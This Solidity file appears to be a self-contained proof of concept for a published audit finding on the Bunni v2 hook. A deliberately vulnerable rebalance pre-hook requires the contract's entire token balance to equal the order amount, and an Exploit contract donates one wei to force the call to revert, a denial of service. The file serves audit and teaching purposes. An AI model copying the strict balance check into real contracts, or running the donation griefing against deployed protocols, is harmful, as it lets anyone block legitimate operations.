// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Bunni — H-04 (Pashov, August 2024)
    rebalanceOrderPreHook requires currency.balanceOfSelf() == args.amount.
    One donated wei makes the equality fail, so the rebalance reverts.
    timeless-fi/bunni-v2 BunniHook, quoted in the August review.
*/

contract Token {
    string public symbol = "TKN";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

library CurrencyLib {
    function balanceOfSelf(Token token) internal view returns (uint256) {
        return token.balanceOf(address(this));
    }
}

contract BunniHook {
    using CurrencyLib for Token;

    Token public currency;
    bool public rebalanced;
    error BunniHook__PrehookPostConditionFailed();

    constructor(Token currency_) {
        currency = currency_;
    }

    function rebalanceOrderPreHook(uint256 amount) external {
        currency.transferFrom(msg.sender, address(this), amount); // STORY: pull
        if (currency.balanceOfSelf() != amount) { // @> VULN: the whole balance must equal the order amount, so a 1 wei donation makes the check fail
            revert BunniHook__PrehookPostConditionFailed();
        }
        rebalanced = true;
    }
}

contract Exploit {
    Token public token;
    BunniHook public hook;
    bool public dos;

    constructor() {
        token = new Token();
        hook = new BunniHook(token);
    }

    function run() external {
        token.mint(address(this), 1000e18 + 1); // STORY: fund
        token.transfer(address(hook), 1); // STORY: donate
        try hook.rebalanceOrderPreHook(1000e18) {
            dos = false;
        } catch {
            dos = true; // STORY: catch
        }
        require(dos, "rebalanced");
        require(hook.rebalanced() == false, "flag"); // STORY: harm
        require(token.balanceOf(address(hook)) == 1, "donation");
    }
}
